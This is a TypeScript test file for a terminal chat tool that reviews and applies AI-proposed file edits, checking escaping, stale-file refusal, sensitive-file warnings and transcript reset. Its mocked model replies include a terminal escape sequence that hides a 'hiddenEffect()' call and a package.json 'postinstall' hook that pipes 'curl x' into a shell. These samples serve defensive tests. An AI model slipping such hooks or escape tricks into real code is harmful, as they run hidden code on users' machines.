    for (const [text, reason] of [[`${block("old")}\n${block("old")}`, "stop"], [block("missing"), "stop"], [block("old"), "length"]] as const) {
      response = text; finish = reason;
      ui.input.setText("Fix @a.ts"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
      assert.equal(chat.pendingCount, 0);
      const panels = ui.transcript.getChildren().filter((child) => child.id.startsWith("update-"));
      assert.ok(panels.length);
      for (const panel of panels) {
        const code = panel.getChildren().find((child) => child.id.endsWith("-block"))!;
        assert.equal(code.getChildren().find((child) => child.id.endsWith("-actions"))!.visible, false);
        const header = panel.getChildren().find((child) => child.id.endsWith("-toggle"))!;
        assert.equal(header.getChildren().find((child) => child.id.endsWith("-hint"))!.visible, false);
      }
    }
    assert.equal(await readFile(path.join(cwd, "a.ts"), "utf8"), "old\n");
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

for (const stale of [false, true]) {
  test(`inline apply guards duplicate clicks and ${stale ? "refuses stale files" : "writes reviewed bytes"}`, async () => {
    const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-inline-apply-"));
    const setup = await createTestRenderer({ width: 140, height: 60, kittyKeyboard: true });
    let release: (() => void) | undefined;
    try {
      const original = "const safe = true;\n";
      const replacement = "const safe = false; /*\x1b]0;*/hiddenEffect();/*\x07*/";
      await writeFile(path.join(cwd, "example.js"), original);
      const client: ChatClient = { chat: { completions: { async create() {
        return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
          { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null,
            content: `<update path="example.js">\n<<<<<<< SEARCH\n${original.trimEnd()}\n=======\n${replacement}\n>>>>>>> REPLACE\n</update>` } },
        ] };
      } } } };
      const chat = new TuiChat(client, { cwd });
      const ui = mountChatUI(setup.renderer, chat, "test");
      ui.input.setText("Fix @example.js"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
      const panel = ui.transcript.getChildren().find((child) => child.id.startsWith("update-"))!;
      const code = panel.getChildren().find((child) => child.id.endsWith("-block"))!;
      const row = code.getChildren().find((child) => child.id.endsWith("-actions"))!;
      const buttons = row.getChildren().find((child) => child.id.endsWith("-buttons"))!;
      const review = buttons.getChildren().find((child) => child.id.endsWith("-review"))!;
      await setup.mockMouse.click(review.x + 2, review.y); await setup.flush();
      const body = code.getChildren().find((child) => child.id.endsWith("-code")) as TextRenderable;
      const text = body.chunks.map((chunk) => chunk.text).join("");
      assert.match(text, /\\u001b\]0;.*hiddenEffect\(\).*\\u0007/);
      assert.doesNotMatch(text, /\x1b|\x07/);
      const apply = buttons.getChildren().find((child) => child.id.endsWith("-apply"))!;
      assert.ok(apply.visible);
      if (stale) await writeFile(path.join(cwd, "example.js"), "changed externally\n");
      const barrier = new Promise<void>((resolve) => { release = resolve; });
      const realApply = chat.apply.bind(chat);
      let writes = 0;
      chat.apply = async (paths) => { writes++; await barrier; return realApply(paths); };
      await setup.mockMouse.click(apply.x + 2, apply.y); await setup.flush();
      assert.ok(ui.working);
      await setup.mockMouse.click(apply.x + 2, apply.y); await setup.flush();
      assert.equal(writes, 1);
      release!(); await waitUntilIdle(ui); await setup.flush();
      assert.equal(await readFile(path.join(cwd, "example.js"), "utf8"), stale ? "changed externally\n" : replacement + "\n");
      assert.equal(chat.pendingCount, 0);
      assert.equal(row.visible, !stale);
      assert.equal(row.getChildren().find((child) => child.id.endsWith("-applied"))!.visible, !stale);
      assert.match(setup.captureCharFrame(), stale ? /changed|Apply failed/i : /Applied updates/);
    } finally { release?.(); await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
  });
}

test("fenced examples and malformed updates remain prose rather than interactive update panels", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-update-examples-"));
  const setup = await createTestRenderer({ width: 120, height: 45, kittyKeyboard: true });
  try {
    const example = '<update path="a.ts">\n<<<<<<< SEARCH\nold\n=======\nnew\n>>>>>>> REPLACE\n</update>';
    let response = `\`\`\`text\n${example}\n\`\`\``;
    const client: ChatClient = { chat: { completions: { async create() {
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: response } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
    for (const answer of [response, `${example}\n<update path="incomplete">`]) {
      response = answer;
      ui.input.setText("Explain the format"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
      assert.ok(!ui.transcript.getChildren().some((node) => node.id.startsWith("update-")));
      assert.equal(chat.pendingCount, 0);
    }
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

test("sensitive targets are flagged in the summary and review; startup notices appear in the transcript", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-sensitive-"));
  const setup = await createTestRenderer({ width: 140, height: 45, kittyKeyboard: true });
  try {
    await writeFile(path.join(cwd, "package.json"), '{ "scripts": { "test": "node --test" } }\n');
    const client: ChatClient = { chat: { completions: { async create() {
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null,
          content: '<update path="package.json">\n<<<<<<< SEARCH\n"test": "node --test"\n=======\n"test": "node --test", "postinstall": "curl x | sh"\n>>>>>>> REPLACE\n</update>' } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test", { notices: ["Ignored .env keys in /repo/.env: ASK_THEME"] });
    await setup.flush();
    assert.match(setup.captureCharFrame(), /Ignored \.env keys in \/repo\/\.env: ASK_THEME/);
    ui.input.setText("Add a hook to @package.json"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.match(setup.captureCharFrame(), /package\.json\s+\+1 -1\s+⚠ package scripts/);
    ui.input.setText("/review package.json"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.match(setup.captureCharFrame(), /⚠ package scripts[^\n]*: this file can run code/);
    ui.input.setText("/reject"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.equal(chat.pendingCount, 0);
    assert.match(await readFile(path.join(cwd, "package.json"), "utf8"), /^\{ "scripts": \{ "test": "node --test" \} \}\n$/);
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

test("new destroys the visible transcript, clears selection/history and preserves the chosen theme", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-reset-transcript-"));
  const setup = await createTestRenderer({ width: 100, height: 40, kittyKeyboard: true });
  try {
    const requests: OneShotRequest[] = [];
    const client: ChatClient = { chat: { completions: { async create(request) {
      requests.push(request);
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null,
          content: "**PRIVATE_ANSWER**\n\n```ts\nconst privateValue = 1;\n```" } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test", { theme: "dracula" });
    const command = async (text: string) => {
      ui.input.setText(text); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
    };
    for (let turn = 0; turn < 3; turn++) {
      await command("PRIVATE_QUESTION");
      assert.match(setup.captureCharFrame(), /PRIVATE_ANSWER/);
      const old = [...ui.transcript.getChildren()];
      await command("/new");
      assert.ok(old.every((node) => node.isDestroyed));
      assert.equal(ui.transcript.getChildren().length, 1);
      assert.doesNotMatch(setup.captureCharFrame(), /PRIVATE_|privateValue/);
      assert.equal(setup.renderer.hasSelection, false);
      assert.equal(chat.lastAnswer, null);
      assert.equal(chat.sessionStats.turns, 0);
      assert.equal(ui.theme.name, "dracula");
      setup.resize(100 + turn, 40); await setup.flush();
    }
    assert.ok(requests.every((request) => request.messages.length === 2), "old turns are not sent after reset");
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

test("selecting punctuation-bearing filenames attaches the selected path, not a parsed prefix", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-mention-roundtrip-"));
  const setup = await createTestRenderer({ width: 100, height: 40, kittyKeyboard: true });
  try {
    await writeFile(path.join(cwd, "notes"), "DECOY");
    const requests: OneShotRequest[] = [];
    const client: ChatClient = { chat: { completions: { async create(request) {
      requests.push(request);
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Answer" } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
    for (const name of ["src/routes/(group)/page.ts", "notes).ts", "notes,", "notes;", "notes:"]) {
      await mkdir(path.dirname(path.join(cwd, name)), { recursive: true });
      await writeFile(path.join(cwd, name), "SELECTED_CONTENT");
      ui.setCandidates([name]);
      ui.input.setText("Explain @"); ui.input.gotoBufferEnd(); await setup.flush();
      setup.mockInput.pressTab(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui);
      assert.deepEqual(chat.attachmentPaths, [name]);
      assert.match(String(requests.at(-1)!.messages.at(-1)!.content), /SELECTED_CONTENT/);
      assert.doesNotMatch(String(requests.at(-1)!.messages.at(-1)!.content), /DECOY/);
      ui.input.setText("/new"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter(); await waitUntilIdle(ui);
    }
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

test("mention completion respects Unicode and text after the cursor; Shift+Enter never submits", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-ui-"));
  const setup = await createTestRenderer({ width: 80, height: 30, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { create: async () => { throw new Error("must not submit"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    ui.setCandidates(["name with spaces.ts", "src/", "src/a.ts"]);
    ui.input.setText("😀 discuss @na later");
    ui.input.cursorOffset = ui.input.editBuffer.measureText("😀 discuss @na");
    await setup.flush();
    setup.mockInput.pressTab();
    assert.equal(ui.input.plainText, '😀 discuss @"name with spaces.ts"  later');
    ui.input.gotoBufferEnd();
    setup.mockInput.pressEnter({ shift: true });
    assert.ok(ui.input.plainText.endsWith("\n"));
    assert.equal(ui.working, false);
    ui.input.setText("Attach @src");
    ui.input.gotoBufferEnd();
    await setup.flush();
    setup.mockInput.pressTab();
    assert.equal(ui.input.plainText, "Attach @src ");
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});
